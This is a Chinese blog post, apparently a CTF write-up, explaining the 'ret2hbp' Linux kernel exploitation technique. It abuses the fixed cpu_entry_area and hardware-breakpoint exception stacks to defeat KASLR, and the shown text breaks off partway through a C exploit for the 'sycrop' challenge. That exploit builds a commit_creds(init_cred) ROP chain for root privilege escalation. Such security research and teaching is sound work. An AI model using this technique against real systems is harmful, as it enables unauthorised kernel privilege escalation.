@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>ret2hbp 将任意地址写转为堆栈越界读写 |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-ret2hbp"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  ret2hbp 将任意地址写转为堆栈越界读写
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/ret2hbp/" class="article-date">
+  <time datetime="2024-05-08T16:00:00.000Z" itemprop="datePublished">2024-05-09</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>Bringing back the stack attack…<br>KASLR最后的余晖罢了…</p>
+<span id="more"></span>
+<p>要在任意地址读的情况下Defeate KASLR,很自然的思路是寻找虚拟地址空间中未随机化的空间.(如FG-KASLR的绕过方式).<br>cpu_entry_area mapping固定在0xfffffe0000000000.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090034524.png"></p>
+<p>关于cpu_entry_area的描述:<br><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/arch/x86/pti.html?highlight=cpu_entry_area#page-table-isolation-pti">https://www.kernel.org/doc/html/latest/arch/x86/pti.html?highlight=cpu_entry_area#page-table-isolation-pti</a><br>总结一下,为引入KPTI,用户页表中需要保存进入和退出内核所需要的数据,这些数据就映射到一个固定的区域cpu_entry_area.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cpu_entry_area is a percpu region that contains things needed by the CPU</span></span><br><span class="line"><span class="comment"> * and early entry/exit code.  Real types aren't used for all fields here</span></span><br><span class="line"><span class="comment"> * to avoid circular header dependencies.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Every field is a virtual alias of some other allocated backing store.</span></span><br><span class="line"><span class="comment"> * There is no direct allocation of a struct cpu_entry_area.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_entry_area</span> {</span></span><br><span class="line">	<span class="type">char</span> gdt[PAGE_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The GDT is just below entry_stack and thus serves (on x86_64) as</span></span><br><span class="line"><span class="comment">	 * a read-only guard page. On 32-bit the GDT must be writeable, so</span></span><br><span class="line"><span class="comment">	 * it needs an extra guard page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">	<span class="type">char</span> guard_entry_stack[PAGE_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">entry_stack_page</span> <span class="title">entry_stack_page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">	<span class="type">char</span> guard_doublefault_stack[PAGE_SIZE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">doublefault_stack</span> <span class="title">doublefault_stack</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On x86_64, the TSS is mapped RO.  On x86_32, it's mapped RW because</span></span><br><span class="line"><span class="comment">	 * we need task switches to work, and task switches write to the TSS.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Exception stacks used for IST entries with guard pages.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cea_exception_stacks</span> <span class="title">estacks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Per CPU debug store for Intel performance monitoring. Wastes a</span></span><br><span class="line"><span class="comment">	 * full page at the moment.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">debug_store</span> <span class="title">cpu_debug_store</span>;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The actual PEBS/BTS buffers must be mapped to user space</span></span><br><span class="line"><span class="comment">	 * Reserve enough fixmap PTEs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">debug_store_buffers</span> <span class="title">cpu_debug_buffers</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中的estacks是Interrupt-Stack的映射.<br>IST机制: <a target="_blank" rel="noopener" href="https://www.cs.utexas.edu/~vijay/cs378-f17/projects/AMD64_Architecture_Programmers_Manual.pdf#G14.908888">https://www.cs.utexas.edu/~vijay/cs378-f17/projects/AMD64_Architecture_Programmers_Manual.pdf#G14.908888</a> 及 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/arch/x86/kernel-stacks.html">https://www.kernel.org/doc/html/latest/arch/x86/kernel-stacks.html</a></p>
+<blockquote>
+<p>A new feature introduced in the AMD64 extensions is called the Interrupt Stack Table (IST), which also resides in the TSS and contains logical (segment+offset) stack pointers. If an interrupt descriptor table specifies an IST entry to use (there are 7), the processor will load the new stack from the IST instead. This allows known-good stacks to be used in case of serious errors (NMI or Double fault for example). Previously, the entry for the exception or interrupt in the IDT pointed to a task gate, causing the processor to switch to the task that is pointed by the task gate. The original register values were saved in the TSS current at the time the interrupt or exception occurred. The processor then set the registers, including SS:ESP, to a known value specified in the TSS and saved the selector to the previous TSS. The problem here is that hardware task switching is not supported on AMD64.</p>
+</blockquote>
+<p>当某中断的IDT条目中IST序号不为0,则当该中断发生时会从TSS中无条件将栈切换到对应的Interrupt-Stack并进行异常处理.同时向栈中压入pt_regs结构.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Macro to enforce the same ordering and stack sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ESTACKS_MEMBERS(guardsize, optional_stack_size)		\</span></span><br><span class="line"><span class="meta">	char	DF_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	DF_stack[EXCEPTION_STKSZ];			\</span></span><br><span class="line"><span class="meta">	char	NMI_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	NMI_stack[EXCEPTION_STKSZ];			\</span></span><br><span class="line"><span class="meta">	char	DB_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	DB_stack[EXCEPTION_STKSZ];			\</span></span><br><span class="line"><span class="meta">	char	MCE_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	MCE_stack[EXCEPTION_STKSZ];			\</span></span><br><span class="line"><span class="meta">	char	VC_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	VC_stack[optional_stack_size];			\</span></span><br><span class="line"><span class="meta">	char	VC2_stack_guard[guardsize];			\</span></span><br><span class="line"><span class="meta">	char	VC2_stack[optional_stack_size];			\</span></span><br><span class="line"><span class="meta">	char	IST_top_guard[guardsize];			\</span></span><br><span class="line"><span class="meta"></span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>于是类似于早期内核栈中保存的pt_regs作栈迁移的手法,这里也可以直接栈迁移.</p>
+<p>更强大的利用是,当内核触发该类异常时,若改变栈上的pt_regs结构,便可劫持内核.若内核在读一段内存时触发该类中断,攻击者通过漏洞更改rcx寄存器(通常用于循环中的计数),即可造成越界读,同理可以造成越界写.<br>而越界读写,无论是在堆上还是栈上,都是Defeate KASLR的有利手段.</p>
+<p>具体来说,比如uname调用是一个很好的栈上的越界读取.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; kernel/sys.c:1280</span></span><br><span class="line"><span class="comment">/* 1280 */</span> SYSCALL_DEFINE1(newuname, <span class="keyword">struct</span> new_utsname __user *, name)</span><br><span class="line"><span class="comment">/* 1281 */</span> {</span><br><span class="line"><span class="comment">/* 1282 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">new_utsname</span> <span class="title">tmp</span>;</span></span><br><span class="line"><span class="comment">/* 1283 */</span> </span><br><span class="line"><span class="comment">/* 1284 */</span> 	down_read(&amp;uts_sem);</span><br><span class="line"><span class="comment">/* 1285 */</span> 	<span class="built_in">memcpy</span>(&amp;tmp, utsname(), <span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="comment">/* 1286 */</span> 	up_read(&amp;uts_sem);</span><br><span class="line"><span class="comment">/* 1287 */</span> 	<span class="keyword">if</span> (copy_to_user(name, &amp;tmp, <span class="keyword">sizeof</span>(tmp)))</span><br><span class="line"><span class="comment">/* 1288 */</span> 		<span class="keyword">return</span> -EFAULT;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>prctl_set_mm_map是一个很好的栈上的越界写入</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; kernel/sys.c:1955</span></span><br><span class="line"><span class="comment">/* 1955 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="comment">/* 1956 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">prctl_set_mm_map</span><span class="params">(<span class="type">int</span> opt, <span class="type">const</span> <span class="type">void</span> __user *addr, <span class="type">unsigned</span> <span class="type">long</span> data_size)</span></span><br><span class="line"><span class="comment">/* 1957 */</span> {</span><br><span class="line">    		<span class="comment">// 目标栈上临时对象</span></span><br><span class="line"><span class="comment">/* 1958 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">prctl_mm_map</span> <span class="title">prctl_map</span> =</span> { .exe_fd = (u32)<span class="number">-1</span>, };</span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 调用copy_from_user，结合任意地址写原语和硬件断点，做到栈溢出ROP攻击</span></span><br><span class="line"><span class="comment">/* 1973 */</span> 	<span class="keyword">if</span> (copy_from_user(&amp;prctl_map, addr, <span class="keyword">sizeof</span>(prctl_map)))</span><br><span class="line"><span class="comment">/* 1974 */</span> 		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="comment">/* 1975 */</span> </span><br><span class="line">    		<span class="comment">// 对prctl_map对象内容进行校验，失败后快速返回触发ROP，不多调用函数</span></span><br><span class="line"><span class="comment">/* 1976 */</span> 	error = validate_prctl_map_addr(&amp;prctl_map);</span><br><span class="line"><span class="comment">/* 1977 */</span> 	<span class="keyword">if</span> (error)</span><br><span class="line"><span class="comment">/* 1978 */</span> 		<span class="keyword">return</span> error;</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>总结下攻击流程：<br>    父进程fork出子进程victim<br>    父进程ptrace victim，父进程给victim设置硬件断点<br>    父进程fork出子进程trigger，循环触发任意地址写原语修改DEBUG Exception stack中的cx寄存器值<br>    victim进程循环调用uname syscall，并检查buffer中是否发现stack leak，如果发现就发送给父进程<br>    父进程拿着stack leak编写出ROP代码发送给victim<br>    victim进程循环调用prctl syscall触发目标copy_from_user，直到发生栈溢出ROP提权。</p>
+</blockquote>
+<p>在6.2版本后的内核已经为该区域加上了随机化,并不只是基址随机化,而是每个entry都进行了随机化.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __init <span class="type">void</span> <span class="title function_">init_cea_offsets</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_cea;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!kaslr_enabled()) {</span><br><span class="line">		for_each_possible_cpu(i)</span><br><span class="line">			per_cpu(_cea_offset, i) = i;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	max_cea = (CPU_ENTRY_AREA_MAP_SIZE - PAGE_SIZE) / CPU_ENTRY_AREA_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* O(sodding terrible) */</span></span><br><span class="line">	for_each_possible_cpu(i) {</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> cea;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line">		cea = get_random_u32_below(max_cea);</span><br><span class="line"></span><br><span class="line">		for_each_possible_cpu(j) {</span><br><span class="line">			<span class="keyword">if</span> (cea_offset(j) == cea)</span><br><span class="line">				<span class="keyword">goto</span> again;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (i == j)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		per_cpu(_cea_offset, i) = cea;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is called from entry code, so must be noinstr */</span></span><br><span class="line">noinstr <span class="keyword">struct</span> cpu_entry_area *<span class="title function_">get_cpu_entry_area</span><span class="params">(<span class="type">int</span> cpu)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> va = CPU_ENTRY_AREA_PER_CPU + cea_offset(cpu) * CPU_ENTRY_AREA_SIZE;</span><br><span class="line">	BUILD_BUG_ON(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> cpu_entry_area) % PAGE_SIZE != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> cpu_entry_area *) va;</span><br><span class="line">}</span><br><span class="line">EXPORT_SYMBOL(get_cpu_entry_area);</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="sycrop"><a href="#sycrop" class="headerlink" title="sycrop"></a>sycrop</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>给了一次内核任意地址的四字节读和一次栈迁移的机会.<br>从cpu_entry_area读泄露kbase,fork出子进程触发一次硬件断点,cpu_entry_area异常处理栈中留下pt_regs结构.再栈迁移到中的pt_regs结构即可完成在通用寄存器中布置的ROP链.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090020538.png"></p>
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090019960.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405082322112.png"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DR_OFFSET(num) ((void *)(&amp;((struct user *)0)-&gt;u_debugreg[num]))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_hbp</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">void</span> *addr)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set DR0: HBP address</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(<span class="number">0</span>), addr) != <span class="number">0</span>) {</span><br><span class="line">        die(<span class="string">"create hbp ptrace dr0: %m"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops</span></span><br><span class="line"><span class="comment">     * on the instruction which causes the exception. bits 16,17 means we stop</span></span><br><span class="line"><span class="comment">     * on data read or write. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> dr_7 = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>);</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_POKEUSER, pid, DR_OFFSET(<span class="number">7</span>), (<span class="type">void</span> *)dr_7) != <span class="number">0</span>) {</span><br><span class="line">        die(<span class="string">"create hbp ptrace dr7: %m"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">child_func</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    raise(SIGSTOP);</span><br><span class="line">    logd(<span class="string">"Child Weakup"</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">".intel_syntax noprefix;"</span></span><br><span class="line">        <span class="string">"mov r15,pop_rdi;"</span></span><br><span class="line">        <span class="string">"mov r14,init_cred;"</span></span><br><span class="line">        <span class="string">"mov r13,commit_creds;"</span></span><br><span class="line">        <span class="string">"mov r12,swapgs_ret2user;"</span></span><br><span class="line">        <span class="string">"mov rbp,   0;"</span></span><br><span class="line">        <span class="string">"mov rbx,   0;"</span></span><br><span class="line">        <span class="string">"mov r11,   user_rip;"</span></span><br><span class="line">        <span class="string">"mov r10,   user_cs;"</span></span><br><span class="line">        <span class="string">"mov r9,    user_rflags;"</span>   </span><br><span class="line">        <span class="string">"mov r8,    user_sp;"</span></span><br><span class="line">        <span class="string">"mov rax,   user_ss;"</span></span><br><span class="line">        <span class="string">"mov rcx,   0xdeadbeef;"</span></span><br><span class="line">        <span class="string">"mov rdx,   0xdeadbeef;"</span></span><br><span class="line">        <span class="string">"mov rsi,   pbuf;"</span></span><br><span class="line">        <span class="string">"mov rdi,   [rsi];"</span></span><br><span class="line">        <span class="string">".att_syntax;"</span></span><br><span class="line">    );</span><br><span class="line">    logd(<span class="string">"Child Exit"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span> pbuf = &amp;buf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds;</span><br><span class="line"><span class="type">size_t</span> prepare_creds;</span><br><span class="line"><span class="type">size_t</span> init_cred;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> swapgs_ret2user;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dev_fd = open(<span class="string">"/dev/seven"</span>,O_RDWR))&lt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        err_exit(<span class="string">"open device"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    kernel_base = (<span class="type">uint32_t</span>)(ioctl(dev_fd,<span class="number">0x5555</span>,<span class="number">0xfffffe0000000004</span>))+</span><br><span class="line">                                            +<span class="number">0xffffffff00000000</span><span class="number">-0x1008e00</span>ULL;</span><br><span class="line">    HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = kernel_base+<span class="number">0x000bb5b0</span>;</span><br><span class="line">    prepare_creds = kernel_base+<span class="number">0x000bb9a0</span>;</span><br><span class="line">    init_cred = kernel_base+<span class="number">0x01a4cbf8</span>;</span><br><span class="line">    pop_rdi = kernel_base+<span class="number">0x2c9d</span>;</span><br><span class="line">    swapgs_ret2user = kernel_base+<span class="number">0x01000ed0</span> + <span class="number">49</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        user_sp += <span class="number">8</span>;</span><br><span class="line">        child_func();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待子进程暂停</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    create_hbp(pid,buf);</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">           </span><br><span class="line">    <span class="comment">//等待子进程触发断点</span></span><br><span class="line">    waitpid(pid,&amp;status,<span class="number">0</span>);</span><br><span class="line">    